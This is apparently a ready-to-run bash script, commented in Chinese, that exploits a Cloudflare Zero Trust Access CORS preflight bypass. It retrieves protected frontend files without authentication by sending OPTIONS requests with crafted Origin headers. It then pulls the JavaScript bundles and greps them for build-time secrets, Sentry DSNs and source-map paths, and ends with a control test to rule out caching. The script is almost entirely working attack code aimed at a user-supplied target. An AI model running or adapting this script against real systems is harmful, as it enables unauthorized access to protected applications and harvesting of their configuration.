# Cloudflare Access CORS preflight 绕过 —— 未认证读取受保护静态前端
# 用法: T=<https://目标域> O=<被接受的 Origin> bash cf-access-cors-preflight-bypass.sh
# 前提: 目标在 Cloudflare Zero Trust Access 之后(GET 302 到 <team>.cloudflareaccess.com)
#       且 origin 对 OPTIONS 返回真实文件(静态中间件/Heroku router 常见)
set -u
T="${T:?set T=https://target}"
O="${O:-$T}"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36'
PRE=(-X OPTIONS -H "Origin: $O" -H 'Access-Control-Request-Method: GET' -H 'Cache-Control: no-cache')

echo '== 1) 基线: 应被 Access 拦截 =='
curl -sk -A "$UA" -D - -o /dev/null "$T/" | sed -n '1,12p'    # 期望 302 + location: https://<team>.cloudflareaccess.com/...

echo '== 2) preflight 绕过取 index =='
curl -sk -A "$UA" "${PRE[@]}" -D idx.hdr -o idx.html "$T/"
sed -n '1,12p' idx.hdr
wc -c idx.html
grep -oE '/assets/[A-Za-z0-9_.-]+\.(js|css)' idx.html | sort -u

echo '== 3) 取 bundle 并提取构建期配置 =='
for p in $(grep -oE '/assets/[A-Za-z0-9_.-]+\.js' idx.html | sort -u); do
  n=$(basename "$p")
  curl -sk -A "$UA" "${PRE[@]}" -o "$n" "$T$p"
  echo "[$p] $(wc -c < "$n") bytes"
  grep -oaE '(VITE|REACT_APP|NEXT_PUBLIC)_[A-Z0-9_]+:"[^"]*"' "$n" | sort -u
  grep -oaE 'https://[A-Za-z0-9.-]+\.ingest[A-Za-z0-9.-]*sentry\.io/[0-9]+' "$n" | sort -u
  grep -oaE 'sourceMappingURL=[^[:space:]"]+' "$n" | sort -u
done

echo '== 4) 二分对照(必做, 排除缓存) =='
u="$T/?cb=$RANDOM"
printf 'OPTIONS+Origin only        -> %s\n' "$(curl -sk -A "$UA" -o /dev/null -w '%{http_code}/%{size_download}' -X OPTIONS -H "Origin: $O" "$u")"
printf 'OPTIONS+ACRM only          -> %s\n' "$(curl -sk -A "$UA" -o /dev/null -w '%{http_code}/%{size_download}' -X OPTIONS -H 'Access-Control-Request-Method: GET' "$u")"
printf 'OPTIONS+Origin+ACRM        -> %s\n' "$(curl -sk -A "$UA" -o /dev/null -w '%{http_code}/%{size_download}' "${PRE[@]}" "$u")"
printf 'GET+Origin+ACRM            -> %s\n' "$(curl -sk -A "$UA" -o /dev/null -w '%{http_code}/%{size_download}' -H "Origin: $O" -H 'Access-Control-Request-Method: GET' "$u")"